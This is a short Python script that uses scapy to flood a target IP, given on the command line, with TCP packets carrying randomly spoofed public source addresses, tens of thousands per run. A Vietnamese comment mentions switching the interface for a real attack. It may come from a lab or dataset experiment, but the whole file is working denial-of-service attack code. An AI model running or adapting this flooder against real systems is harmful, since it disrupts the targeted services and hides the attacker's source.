import sys
import time
import random
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP, send
from random import randrange
import time
import string
import random

def payload_generator(size, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def generateSourceIP():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
        #print first

    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
    print(ip)
    return ip


def main(): # 2500 packets attack
    for i in range (1, 5):
        launchAttack()
        #time.sleep ()

def launchAttack():
  #eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
  destinationIP = sys.argv[1:]
  #print destinationIP

  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  for i in range(0, 50000):
    packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / TCP(dport = 1, sport = 80)/payload_generator(size=randrange(1,5))
 
    print(repr(packets))
    # iface = interface.rstrip()
    # print(iface)
    #send packets with interval = 0.025 s
    #send(packets, iface = interface.rstrip(), inter = 0.05)
    sendp(packets, iface = 'eno1', inter = 0.025) #Su interface khi tan cong that
    

if __name__=="__main__":
  main()
                                                                                                                                                                                                                                                                                                       
